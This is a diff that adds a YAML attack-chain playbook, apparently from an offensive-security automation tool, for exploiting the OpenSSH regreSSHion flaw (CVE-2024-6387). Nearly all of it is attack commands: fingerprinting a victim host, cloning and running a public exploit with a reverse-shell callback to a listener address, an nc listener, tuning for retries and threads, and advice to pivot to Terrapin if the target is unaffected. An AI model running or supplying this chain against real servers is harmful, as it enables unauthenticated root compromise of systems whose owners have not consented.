@@ -1,0 +1,68 @@
+chain_id: regresshion_cve_2024_6387
+title: "OpenSSH — regreSSHion (CVE-2024-6387) pre-auth RCE via signal-handler race"
+severity: CRITICAL
+tags: [ssh, openssh, cve-2024-6387, regresshion, race-condition, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-6387" }
+    - { banner_pattern: "(?i)openssh.*(8\\.5p1|8\\.6p1|8\\.7p1|8\\.8p1|8\\.9p1|9\\.[0-7]p[0-9])" }
+
+description: |
+  OpenSSH 8.5p1 → 9.7p1 reintroduced a signal-handler race
+  (CVE-2006-5051 regression — hence "regreSSHion") in `sshd`. By
+  letting LoginGraceTime expire mid-authentication, an unauth
+  attacker triggers async-signal-unsafe code in SIGALRM. Result:
+  pre-auth RCE as root on glibc Linux. Real-world reliability is
+  ~10k connections per pop on default config; trivial on slow
+  networks. Disclosed Jul 2024.
+
+steps:
+  - id: 1
+    title: "Confirm OpenSSH and version"
+    command: |
+      nc -nv $VICTIMA 22
+      # Banner: SSH-2.0-OpenSSH_X.Yp1 …
+      nmap -sV -p 22 $VICTIMA
+
+  - id: 2
+    title: "Detect glibc target (Linux only — non-glibc not exploitable)"
+    command: |
+      # Off-target if banner looks like Solaris/AIX/BSD. Confirm with
+      # ssh-audit:
+      pip install ssh-audit && ssh-audit $VICTIMA
+
+  - id: 3
+    title: "Run the public PoC (slow, expect minutes-to-hours)"
+    command: |
+      git clone https://github.com/zgzhang/cve-2024-6387-poc /tmp/regresshion
+      python3 /tmp/regresshion/exploit.py -t $VICTIMA -p 22 \
+        -lh 10.0.2.15 -lp 4444 --threads 200
+
+  - id: 4
+    title: "Listener"
+    command: nc -lvnp 4444
+
+  - id: 5
+    title: "Tuning — lower LoginGraceTime makes the race easier"
+    command: |
+      # If you can verify the target uses LoginGraceTime 120 (default),
+      # the PoC's --max-tries 10000 typically lands. Larger values:
+      python3 /tmp/regresshion/exploit.py -t $VICTIMA -p 22 \
+        --max-tries 100000 --threads 256
+
+common_errors:
+  - error: "Banner says OpenBSD or muslibc → not exploitable"
+    solution: |
+      regreSSHion is a *glibc* signal-handling bug. OpenBSD's sshd
+      is unaffected. musl-based Alpine: unaffected. Pivot to
+      Terrapin (CVE-2023-48795) for downgrade attacks instead.
+  - error: "PoC stalls — no race window opening"
+    solution: |
+      LoginGraceTime set to 0 (disabled) blocks the bug entirely.
+      That's actually a documented hardening, common on internet-
+      exposed bastions. Different attack class needed.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-6387
+  - https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt
